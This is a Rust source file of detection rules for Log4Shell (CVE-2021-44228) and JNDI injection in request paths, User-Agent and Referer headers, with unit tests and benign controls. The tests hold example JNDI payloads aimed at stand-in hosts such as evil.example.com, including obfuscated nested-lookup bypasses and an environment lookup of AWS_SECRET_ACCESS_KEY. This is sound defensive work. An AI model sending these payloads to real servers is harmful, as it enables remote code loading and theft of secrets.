//! Log4Shell (CVE-2021-44228) and generic JNDI injection probes, including
//! percent-encoded and nested-lookup obfuscation.

use super::rule::RuleSpec;
use crate::model::threat::Category;

pub const SPECS: &[RuleSpec] = &[
    RuleSpec::target(
        "LOG4SHELL-001",
        "JNDI lookup in request target",
        "jndi_lookup",
        Category::Log4Shell,
        10,
        r"\$\{jndi:(?:ldap|rmi|dns|http|https|iiop)",
    ),
    RuleSpec::raw(
        "LOG4SHELL-002",
        "Percent-encoded JNDI lookup",
        "jndi_url_encoded",
        Category::Log4Shell,
        10,
        r"%24%7bjndi",
    ),
    RuleSpec::target(
        "LOG4SHELL-003",
        "Bare JNDI URL",
        "jndi_bare_url",
        Category::Log4Shell,
        10,
        r"jndi:(?:ldap|rmi|dns|http|https|iiop)://",
    ),
    RuleSpec::target(
        "LOG4SHELL-004",
        "Nested lower/upper lookup obfuscation",
        "jndi_nested_lookup",
        Category::Log4Shell,
        10,
        r"\$\{(?:lower|upper|::-)[^}]*\$\{",
    ),
    RuleSpec::target(
        "LOG4SHELL-005",
        "Log4j environment or system lookup",
        "log4j_env_lookup",
        Category::Log4Shell,
        10,
        r"\$\{(?:env|sys|java|date|base64|main|ctx|map|marker|docker|k8s|log4j|spring|hadoop):",
    ),
    RuleSpec::target(
        "LOG4SHELL-006",
        "Obfuscated JNDI lookup prefix",
        "jndi_obfuscated_prefix",
        Category::Log4Shell,
        10,
        r"\$\{[^}]*jndi:",
    ),
    RuleSpec::user_agent(
        "LOG4SHELL-007",
        "JNDI lookup in User-Agent",
        "jndi_in_user_agent",
        Category::Log4Shell,
        10,
        r"\$\{jndi:|%24%7bjndi",
    ),
    RuleSpec::referer(
        "LOG4SHELL-008",
        "JNDI lookup in Referer",
        "jndi_in_referer",
        Category::Log4Shell,
        10,
        r"\$\{jndi:|jndi:(?:ldap|rmi|dns)",
    ),
    RuleSpec::raw(
        "LOG4SHELL-009",
        "Encoded nested JNDI payload",
        "jndi_encoded_nested",
        Category::Log4Shell,
        10,
        r"%24%7b[a-z0-9%:{}_$-]*jndi",
    ),
    // Canonical CVE-2021-44228 bypass: `${${lower:j}ndi:rmi://...}` resolves
    // the inner lookup to `j`, leaving `jndi:` *after* the closing brace, so
    // every contiguous-prefix rule above misses it.
    RuleSpec::target(
        "LOG4SHELL-010",
        "Nested lookup resolving to a JNDI scheme",
        "jndi_nested_scheme",
        Category::Log4Shell,
        10,
        r"\$\{[^}]*\}\s*(?:j?ndi):(?:ldap|rmi|dns|http|https|iiop)",
    ),
    RuleSpec::target(
        "LOG4SHELL-011",
        "Nested Log4j lookup expression",
        "nested_lookup_expression",
        Category::Log4Shell,
        9,
        r"\$\{\$\{",
    ),
];

#[cfg(test)]
mod tests {
    use super::super::test_util::{assert_clean, assert_hit, entry, entry_ua};

    #[test]
    fn detects_plain_jndi_payloads() {
        assert_hit(&entry("/?x=${jndi:ldap://evil.example.com/a}"), "LOG4SHELL-001");
        assert_hit(&entry("/?x=${jndi:rmi://evil.example.com:1099/a}"), "LOG4SHELL-001");
        assert_hit(&entry("/?x=jndi:ldap://evil.example.com/a"), "LOG4SHELL-003");
        assert_hit(&entry("/?x=${jndi:dns://dns.evil.example}"), "LOG4SHELL-001");
    }

    #[test]
    fn detects_encoded_and_obfuscated_payloads() {
        assert_hit(
            &entry("/?x=%24%7bjndi%3aldap%3a%2f%2fevil%2fa%7d"),
            "LOG4SHELL-002",
        );
        assert_hit(&entry("/?x=${lower:${lower:jndi}}"), "LOG4SHELL-004");
        assert_hit(&entry("/?x=${env:AWS_SECRET_ACCESS_KEY}"), "LOG4SHELL-005");
        assert_hit(&entry("/?x=${::-jndi:ldap://x}"), "LOG4SHELL-006");
    }

    /// Regression for the report's P0 false negative: the canonical nested
    /// lookup expands to `jndi:` across the closing brace.
    #[test]
    fn detects_nested_lookup_jndi_bypass() {
        assert_hit(&entry("/?x=${${lower:j}ndi:rmi://evil/b}"), "LOG4SHELL-010");
        assert_hit(&entry("/?x=${${lower:j}ndi:rmi://evil/b}"), "LOG4SHELL-011");
        assert_hit(
            &entry("/?x=${${lower:j}ndi:ldap://evil.example.com/a}"),
            "LOG4SHELL-010",
        );
        assert_hit(
            &entry("/?x=${${env:NaN:-j}ndi:ldap://evil.example.com/a}"),
            "LOG4SHELL-010",
        );
        // Bare `${${` is suspicious even without a resolvable scheme.
        assert_hit(&entry("/?x=${${upper:x}}"), "LOG4SHELL-011");
        // Percent-encoded nested form: decoded view still catches it.
        assert_hit(
            &entry("/?x=%24%7B%24%7Blower%3Aj%7Dndi%3Armi%3A%2F%2Fevil%2Fb%7D"),
            "LOG4SHELL-010",
        );
    }

    #[test]
    fn ignores_benign_dollar_brace_usage() {
        assert_clean(&entry("/?q=shell+uses+%24%7BHOME%7D+for+the+home+directory"));
        assert_clean(&entry("/docs/templating?ref=%24%7Bname%7D"));
        assert_clean(&entry("/blog/understanding-log4shell"));
    }

    #[test]
    fn detects_jndi_in_headers() {
        let ua = entry_ua("/", "${jndi:ldap://evil.example.com/a}");
        assert_hit(&ua, "LOG4SHELL-007");
        let encoded_ua = entry_ua("/", "%24%7bjndi%3aldap%3a%2f%2fx");
        assert_hit(&encoded_ua, "LOG4SHELL-007");
        let mut referer = entry("/");
        referer.referer = Some("http://attacker/${jndi:ldap://evil/a}".to_string());
        assert_hit(&referer, "LOG4SHELL-008");
    }

    #[test]
    fn ignores_benign_log4j_mentions() {
        assert_clean(&entry("/blog/log4j-explained"));
        assert_clean(&entry("/search?q=logging+best+practices"));
        assert_clean(&entry("/api/v1/config?env=production"));
    }
}
